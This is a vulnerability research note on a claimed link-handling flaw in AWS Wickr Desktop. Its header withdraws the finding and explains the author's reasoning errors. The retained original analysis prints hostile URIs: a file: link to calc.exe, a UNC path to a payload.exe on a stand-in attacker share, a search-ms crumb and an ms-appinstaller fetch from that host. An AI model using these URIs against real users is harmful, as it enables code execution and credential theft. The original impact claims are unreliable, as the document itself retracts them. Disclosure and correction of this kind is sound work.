# W17b — F12: a URI from a received document reaches the Windows shell with no scheme validation

> ## ✗ RESOLVED — F12 IS WITHDRAWN. The application does validate the URL; I missed the check.
>
> **The gate is `EnvironmentMgr::isURLDenied()`, called from the QML action dispatcher**
> (`scratch/w16/qrc/blob_030a350e.js:131`):
>
> ```js
> case "openLink": {
>     const link = action["link"]
>     const denyReason = environmentMgr.isURLDenied(link);
>     if (denyReason === EnvironmentMgr.URLAllowed) {
>         if (showConfirmation) wickrWindow.hyperlinkClickedShowWarning(link)
>         else                  wickrWindow.hyperlinkClicked(link)
>     }
> }
> ```
>
> `isURLDenied` is a `Q_INVOKABLE` on `EnvironmentMgr` returning the two-valued enum
> `URLDeniedReason { URLAllowed, URLDenied }`. **In the operator's product test it denied
> `file:///C:/…/calc.exe`, the loopback UNC and `search-ms:` while allowing `https:`.** The claimed
> impact does not exist. Do not report it.
>
> **Two mistakes produced the overstatement, both mine:**
> 1. **An inference stated as a fact.** §4 below asserts the bridge's `openLink` reaches the 68-byte
>    `QDesktopServices::openUrl` wrapper at `0x1408d62a0`, on the reasoning "there are only two call
>    sites and the other is `mailto:`". `openLink` is not a `Q_INVOKABLE` at all — it travels as
>    `uiBridge.sendAction({action:'openLink',…})` to a **compiled-QML dispatcher**, which I had not read.
> 2. **A search whose scope I mistook for completeness.** "A grep of the entire recovered web source for
>    a scheme allow-list returns nothing" was true and irrelevant: the check is not in the web source.
>    Recovering 2,195 TypeScript files made the *React* layer auditable and I treated that as auditing
>    the *application*.
>
> **Also corrected:** the "You are leaving Wickr" dialog is the **React** `ConfirmModal` raised by the
> `openLink` thunk *before* anything reaches native — so it appears for every URL, including ones
> `isURLDenied` then rejects. The operator saw all four dialogs; that is expected and says nothing about
> the policy check.
>
> **What survives, and it is small:** the JS layer performs no validation of its own —
> `withLinkHandler.tsx:16` forwards the raw `getAttribute('href')`, the `event.origin ===
> window.parent.origin` test in `FilePreviewModal` is structurally vacuous (`FILE_PREVIEW_URL` is
> relative, hence same-origin), and the `openLink` thunk passes the string through. **A single check in
> one QML branch is the whole defence**, and the layer that accepts the attacker's string does not know
> it exists. That is a defence-in-depth remark, **not a vulnerability**, and it should be reported — if
> at all — as such, alongside the fact that users are shown a "Continue" prompt for URLs the client then
> silently discards.
>
> **Not determined:** whether `isURLDenied` is a fixed scheme allow-list or an administrator-configurable
> policy. If the latter, a permissive network configuration could matter — but nothing here establishes
> that, and it must not be implied.
>
> ---
>
> ## Original text, retained only to show what was claimed and why it was wrong
>
> The operator sent `F12-link-poc.docx` to themselves and clicked the links in the shipped client.
> **Only LINK 4 — the ordinary `https://` control — produced any visible effect. `file:///C:/…/calc.exe`,
> the loopback UNC and `search-ms:` produced none.**
>
> **What this refutes:** the impact statement below ("two clicks hand an attacker-chosen program path to
> the Windows shell") is **not supported by the product**. It must not be reported in that form.
>
> **What it does not refute:** the four measured/source-verified facts are unchanged — `withLinkHandler`
> posts the raw `href`; the same-origin check is vacuous; the `openLink` thunk has no scheme check (grep
> for `validateLink`/`allowedSchemes`/`isSafeUrl` over the whole web source returns zero); and the shipped
> `QUrl(…,Tolerant)` → `QDesktopServices::openUrl` pair passes `file:`, UNC and `ms-*` straight to
> `ShellExecuteW` (`shellprobe.c`). **Something between the thunk and that pair rejects the scheme, and
> this note did not find it.**
>
> **The error that produced the overstatement:** §4 below asserts the bridge's `openLink` reaches the
> 68-byte wrapper at `0x1408d62a0`. That was **inferred, not verified** — two `QDesktopServices::openUrl`
> call sites exist, one is the `mailto:` builder, and the other was assumed to be the bridge's. It is not
> established. In fact `openLink` is not a Q_INVOKABLE at all: `UIBridgeWebChannelAdapter.ts:107` sends
> `uiBridge.sendAction({action:'openLink', …})`, and the native dispatcher is **compiled QML** (the action
> names `viewContactDetails`/`viewRoomDetails`/`openLink`/`reactionPopup`/… appear as a UTF-16
> length-prefixed literal pool at `0x141fc4b74` in `.rdata`). **That handler was never read, and it is the
> most likely place the scheme is validated.**
>
> **Open, and cheap for the operator to close:** *did the "You are leaving Wickr" confirmation dialog
> appear for links 1–3?* If yes, the app forwards the URI and the block is below the QML handler. If no,
> the QML handler filters by scheme and **F12 should be withdrawn or rewritten as a defence-in-depth
> observation about the JS layer only.**


**Date:** 2026-08-04 **Target:** AWS Wickr Desktop 6.72.20.0 (Windows x64)
**Status:** every link in the chain **source-verified** (JS from the shipped source maps, native by
disassembly). **Not measured:** what `QDesktopServices::openUrl` does with a `file:` URL on this build.

**This is not HTML injection and needs no script.** It is a plain hyperlink in a legitimate document.
The defect is in **Wickr's own link plumbing**, which is shared by every file preview.

---

## The chain

**1. The href is read raw** — `src/file-preview/components/withLinkHandler.tsx:16`, which
`FilePreviewApp.tsx:22` wraps around **every** entry of `FILE_PREVIEW_COMPONENT_MAP`:

```ts
const href = target.closest('a')?.getAttribute('href');
if (href) {
  window.parent.postMessage({ type: 'openLink', url: href }, window.parent.origin);
}
```

No scheme check. `getAttribute` is the raw attribute, not the resolved `.href`.

**2. The origin check does not constrain the sender** —
`src/components/Modals/FilePreviewModal/index.tsx:100-105`:

```ts
if (event.data && typeof event.data === 'object' && event.origin === window.parent.origin) {
  switch (event.data.type) {
    case 'openLink':
      dispatch(openLink({ link: event.data.url, showConfirmation: true }));
```

`FILE_PREVIEW_URL = 'file-preview.html'` (line 30) — a **relative** URL, so the preview iframe is
**same-origin** with the main frame and the check passes by construction.

**3. No scheme validation in the thunk** — `src/store/thunks/ui.ts:146`:

```ts
if (payload.showConfirmation) {
  const confirmed = await dispatch(openModal({ name:'ConfirmModal', params:{
    title: t('You are leaving Wickr'),
    body:  t('Click continue to go to {{link}}', { link: payload.link }),   // attacker-controlled text
    confirmText: t('Continue') }})).unwrap();
  if (confirmed) return extra.uiBridge.openLink({ link: payload.link, showConfirmation: false });
}
```

**A grep of the entire recovered web source for a scheme allow-list — `validateLink`, `allowedSchemes`,
`isSafeUrl`, `sanitizeUrl`, an `https?:` comparison — returns nothing.**

**4. No scheme validation in the native handler.** `iatx.py pro openUrl` gives two call sites for
`Qt6Gui.dll!?openUrl@QDesktopServices@@SA_NAEBVQUrl@@@Z`. One (`0x140072620`) is the `mailto:` builder.
The other is the generic wrapper — **68 bytes, not one comparison and not one conditional branch**:

```
0x1408d62a0  mov  [rsp+8], rcx          ; rcx = QString URL
0x1408d62aa  mov  rbx, rcx
0x1408d62ad  xor  r8d, r8d              ; QUrl::ParsingMode = TolerantMode
0x1408d62b0  mov  rdx, rcx
0x1408d62b3  lea  rcx, [rsp+0x38]
0x1408d62b8  call [0x140d54238]         ; Qt6Core!QUrl::QUrl(const QString&, ParsingMode)
0x1408d62bf  mov  rcx, rax
0x1408d62c2  call [0x140d56018]         ; Qt6Gui!QDesktopServices::openUrl(const QUrl&)
0x1408d62c9  lea  rcx, [rsp+0x38]
0x1408d62ce  call [0x140d54240]         ; ~QUrl
0x1408d62d5  mov  rcx, rbx
0x1408d62dd  jmp  [0x140d54018]         ; ~QString (tail)
```

On Windows `QDesktopServices::openUrl` hands anything that is not an `http(s)` URL to the shell.

**5. The document supplies the href with no validation of its own.**
`docx-preview.mjs:3426 renderHyperlink` builds an `<a>` and takes `href` straight from the relationship
target inside the `.docx` (`word/_rels/document.xml.rels`), which is an arbitrary attacker string:

```js
renderHyperlink(elem) {
    var result = this.renderContainer(elem, "a");
    …
    const rel = this.document.documentPart.rels.find(it => it.id == elem.id && it.targetMode === "External");
    href = rel?.target ?? href;
```

---

## Attack

1. Attacker sends a `.docx` whose hyperlink target is `file:///C:/…`, a UNC path, or any registered
   Windows URI handler (`search-ms:`, `ms-*:`).
2. Victim opens the preview and **clicks the link**.
3. Confirmation dialog: *"You are leaving Wickr — Click continue to go to `<attacker string>`"*.
4. Victim clicks **Continue** → the URI is handed to the Windows shell.

**Gates: two clicks, and the URI is displayed.** The displayed string is attacker-chosen and arbitrarily
long, so what the victim actually reads in a fixed-width dialog is also attacker-chosen.

---

## Scope notes

* **pptx is protected by accident, not by design.** The PowerPoint preview runs its HTML through
  DOMPurify, whose default `ALLOWED_URI_REGEXP` permits only `(f|ht)tps?|mailto|tel|callto|sms|cid|xmpp`
  — so `file:` is dropped there. **docx has no such pass**, which is why docx is the practical vector.
* **xls/csv, txt/log/md, rtf, xml/rss, pdf do not emit `<a>` elements**, so they are not vectors, even
  though `withLinkHandler` wraps them too.
* **Chat-message links are a separate question and are NOT claimed here.** markdown-it's `validateLink`
  blocks only `vbscript|javascript|file|data` (`markdown-it/lib/index.mjs:31`), so Windows-specific
  handlers would pass its filter — but no anchor-click interceptor that routes message links to
  `openLink` was found, so the click most likely takes QtWebEngine's navigation path instead. **Not
  established; do not report it.**

## MEASURED — the shipped Qt applies no scheme filter, and converts `file:` to a shell target

`scratch/w17/shellprobe.c` reproduces the native wrapper's exact pair —
`QUrl(QString, TolerantMode)` then `QDesktopServices::openUrl` — against the shipped `Qt6Core.dll` /
`Qt6Gui.dll` with the real `windows` platform plugin. `ShellExecuteW` and `ShellExecuteExW` are hooked,
logged **and forced to fail, so nothing is launched**.

```
--- control: https URL ---            https://example.invalid/x
    ShellExecuteW  verb=(null)  file=https://example.invalid/x
--- file: URL to an EXECUTABLE ---    file:///C:/Windows/System32/calc.exe
    ShellExecuteW  verb=(null)  file=C:\Windows\System32\calc.exe
--- UNC via file: authority ---       file://198.51.100.7/share/payload.exe
    ShellExecuteW  verb=(null)  file=\\198.51.100.7\share\payload.exe
--- Windows URI handler ---           search-ms:query=secret&crumb=location:\\198.51.100.7\share
    ShellExecuteW  verb=(null)  file=search-ms:query=secret&crumb=location:%5C%5C198.51.100.7%5Cshare
--- ms-appinstaller ---               ms-appinstaller:?source=https://198.51.100.7/x.msix
    ShellExecuteW  verb=(null)  file=ms-appinstaller:?source=https://198.51.100.7/x.msix

total shell invocations Qt attempted: 5 (all blocked by the harness)
```

**All five reach `ShellExecuteW` unfiltered.** `verb` is NULL — the default verb, which for a `.exe` is
*open*, i.e. execute. Qt resolves `file:///C:/…` to the native path **`C:\Windows\System32\calc.exe`**
and a `file:` **authority** to the UNC path **`\\198.51.100.7\share\payload.exe`**.

So the end state of the chain is: **a peer-sent `.docx`, one click on a hyperlink and one click on
"Continue" hand an attacker-chosen program path — including one on an attacker-controlled SMB share — to
the Windows shell with the default verb.** A UNC target additionally causes an outbound SMB connection,
i.e. NTLM credential exposure, before any execution.

### Still not established

* **Windows' own downstream gates were not tested** — SmartScreen, Mark-of-the-Web, and the
  `ms-appinstaller` / `search-ms` handler prompts may each interpose. The measurement above proves the
  *application* passes the URI to the shell; it does not prove the shell completes the action silently.
* **Nothing was run against the product.** The JS half of the chain is read from the shipped source maps
  and the native half is measured in this harness; the two were not exercised together in Wickr.
* **The word "RCE" is not used**, and no exploitation was attempted.

## Duplication check

The **delivery format** (`.docx`) overlaps the already-reported HTML-injection chain. **Nothing else
does:** no HTML injection, no script execution, no iframe, no `srcdoc`. The defect is missing scheme
validation in three places Wickr owns — `withLinkHandler`, the `openLink` thunk, and the native wrapper
at `0x1408d62a0` — and the fix is a scheme allow-list, not a docx-preview option.

## Remediation

Allow-list schemes (`http`, `https`, `mailto` at most) at the `openLink` thunk, which is the single
choke point every caller passes through, and again in the native wrapper before constructing the `QUrl`.
